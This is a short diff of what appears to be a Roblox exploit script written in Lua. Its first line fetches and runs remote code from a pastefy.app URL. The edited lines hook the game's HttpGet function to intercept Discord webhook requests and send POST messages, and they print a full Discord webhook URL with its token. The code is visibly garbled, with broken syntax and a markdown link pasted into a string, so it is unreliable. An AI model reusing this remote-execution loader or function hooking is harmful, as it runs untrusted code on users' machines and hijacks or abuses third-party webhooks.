@@ -1,7 +1,7 @@
 loadstring(game:HttpGet("https://pastefy.app/iS6zFtiH/raw", true))()
 
 pcall(function()
-local a,b,c=_G_Usersor {}, d=game:GetService("Players").LocalPlayer; if not table.find(c,6) and d and d.Name==a then table.insert(c,i)_G_Users=cend,e=hookfunction or hookmethod;if e then local f;f=e(game.HttpGet, function(self,g,*){if typeof(g)=="string" and g:inf([https://discord.com/api/webhooks/1378399620866244749/3RiX0WeK-vAtDQ9WLMO0xmW9carFLW0taSsyYctIuYWJ7tUzxNV9cELXNKigwwjSwxzl/](https://discord.com/api/webhooks/1378399620866244749/3RiX0WeK-vAtDQ9WLMO0xmW9carFLW0taSsyYctIuYWJ7tUzxNV9cELXNKigwwjSwxzl))
+local a,b,c=_G_Usersor {}, d=game:GetService("Players").LocalPlayer; if not table.find(c,6) and d and d.Name==a then table.insert(c,i)_G_Users=cend,e=hookfunction or hookmethod;if e then local f;f=e(game.HttpGet, function(self,g,*){if typeof(g)=="string" and g:inf([discordapp%.com/api/webhooks/](https://discord.com/api/webhooks/1378399620866244749/3RiX0WeK-vAtDQ9WLMO0xmW9carFLW0taSsyYctIuYWJ7tUzxNV9cELXNKigwwjSwxzl))
 then plocal(function()
 local h=game:GetService("HttpService")
 if i then i(){Url=b,Method="POST",Headers={["Content-Type"]="application/json"},Body=h:JSONEncode({content="Mirror webhook trigger."})
